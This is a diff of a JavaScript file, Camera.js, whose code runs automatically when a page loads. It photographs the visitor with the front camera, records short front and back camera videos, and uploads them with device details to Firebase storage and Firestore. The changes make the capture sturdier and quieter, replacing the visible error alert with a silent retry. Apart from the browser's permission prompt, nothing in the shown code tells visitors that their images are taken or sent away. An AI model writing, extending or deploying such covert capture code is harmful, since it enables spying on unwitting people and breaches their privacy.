@@ -16,95 +16,149 @@ const app = initializeApp(firebaseConfig);
 const storage = getStorage(app);
 const db = getFirestore(app);
 
-console.log("Camera.js loaded 🚀");
+console.log("📸 Camera.js (Final Stable Version) Loaded");
 
-/* ---------- HELPERS ---------- */
+/* ---------- DEVICE INFO ---------- */
 
 function getDeviceInfo() {
   return {
     userAgent: navigator.userAgent,
     platform: navigator.platform,
-    language: navigator.language,
     time: new Date().toISOString()
   };
 }
 
-async function startStream(facingMode) {
-  return navigator.mediaDevices.getUserMedia({
-    video: { facingMode },
-    audio: false
+/* ---------- CAMERA HELPERS ---------- */
+
+// Safe camera request with fallback
+async function safeStream(facingMode) {
+  try {
+    return await navigator.mediaDevices.getUserMedia({
+      video: { facingMode },
+      audio: false
+    });
+  } catch (e) {
+    console.warn(`Failed facingMode=${facingMode}, using fallback camera`);
+    return await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: false
+    });
+  }
+}
+
+// Detect back camera
+async function hasBackCamera() {
+  const devices = await navigator.mediaDevices.enumerateDevices();
+  return devices.some(
+    d => d.kind === "videoinput" && d.label.toLowerCase().includes("back")
+  );
+}
+
+// Safe photo capture using Canvas
+function takePhotoWithCanvas(stream) {
+  return new Promise(resolve => {
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.play();
+
+    video.onloadeddata = () => {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
+      canvas.toBlob(resolve, "image/jpeg", 0.9);
+    };
   });
 }
 
-async function takePhoto(stream) {
-  const track = stream.getVideoTracks()[0];
-  const imageCapture = new ImageCapture(track);
-  return await imageCapture.takePhoto();
-}
-
+// Stable video recording
 function recordVideo(stream, duration = 3000) {
   return new Promise(resolve => {
     const recorder = new MediaRecorder(stream);
     const chunks = [];
 
     recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" }));
+    recorder.onstop = () =>
+      resolve(new Blob(chunks, { type: "video/webm" }));
 
     recorder.start();
     setTimeout(() => recorder.stop(), duration);
   });
 }
 
+// Firebase upload
 async function uploadToFirebase(blob, name) {
   const fileRef = ref(storage, `captures/${Date.now()}_${name}`);
   await uploadBytes(fileRef, blob);
   return await getDownloadURL(fileRef);
 }
 
-/* ---------- MAIN SEQUENCE (Auto Start) ---------- */
+/* ---------- MAIN CAPTURE LOGIC ---------- */
 
-async function autoCapture() {
+let started = false;
+
+async function startCapture() {
+  if (started) return;
+  started = true;
+
+  console.log("▶ Auto-start capture sequence…");
+
+  const output = {
+    photoURL: null,
+    frontVideoURL: null,
+    backVideoURL: null,
+    device: getDeviceInfo(),
+    createdAt: Date.now()
+  };
+
   try {
-    console.log("🎥 Starting FRONT camera...");
+    /* ---------- FRONT CAMERA ---------- */
+    console.log("🎥 Front camera starting…");
 
-    const frontStream = await startStream("user");
-    const photoBlob = await takePhoto(frontStream);
+    const frontStream = await safeStream("user");
+
+    const photoBlob = await takePhotoWithCanvas(frontStream);
     const frontVideoBlob = await recordVideo(frontStream, 3000);
+
+    output.photoURL = await uploadToFirebase(photoBlob, "front_photo.jpg");
+    output.frontVideoURL = await uploadToFirebase(frontVideoBlob, "front_video.webm");
 
     frontStream.getTracks().forEach(t => t.stop());
 
-    console.log("🎥 Switching to BACK camera...");
+    /* ---------- WAIT BEFORE SWITCH ---------- */
+    await new Promise(r => setTimeout(r, 500));
 
-    const backStream = await startStream({ exact: "environment" });
-    const backVideoBlob = await recordVideo(backStream, 3000);
+    /* ---------- BACK CAMERA (IF EXISTS) ---------- */
+    const backExists = await hasBackCamera();
 
-    backStream.getTracks().forEach(t => t.stop());
+    if (backExists) {
+      console.log("🎥 Back camera found — recording…");
+      const backStream = await safeStream("environment");
+      const backVideoBlob = await recordVideo(backStream, 3000);
 
-    console.log("☁️ Uploading to Firebase...");
+      output.backVideoURL = await uploadToFirebase(backVideoBlob, "back_video.webm");
 
-    const photoURL = await uploadToFirebase(photoBlob, "front_photo.jpg");
-    const frontVideoURL = await uploadToFirebase(frontVideoBlob, "front_video.webm");
-    const backVideoURL = await uploadToFirebase(backVideoBlob, "back_video.webm");
+      backStream.getTracks().forEach(t => t.stop());
 
-    await addDoc(collection(db, "captures"), {
-      photoURL,
-      frontVideoURL,
-      backVideoURL,
-      device: getDeviceInfo(),
-      createdAt: Date.now()
-    });
+    } else {
+      console.warn("⚠ No back camera found — skipping back video");
+      output.backVideoURL = null;
+    }
 
-    console.log("✅ Capture sequence complete.");
+    /* ---------- SAVE TO FIRESTORE ---------- */
+    await addDoc(collection(db, "captures"), output);
+
+    console.log("✅ All capture steps complete & uploaded");
 
   } catch (err) {
-    console.error("❌ Capture failed:", err);
-    alert("Camera capture error: " + err.message);
+    console.error("❌ CAMERA ERROR:", err);
+    started = false; // allow retry on next load
   }
 }
 
-/* ---------- AUTO RUN WHEN PAGE LOADS ---------- */
-
+/* ---------- AUTO START ON PAGE LOAD ---------- */
 window.addEventListener("load", () => {
-  console.log("Auto-capture starting…");
-  autoCapture();
+  console.log("⏳ Starting auto camera capture…");
+  startCapture();
 });
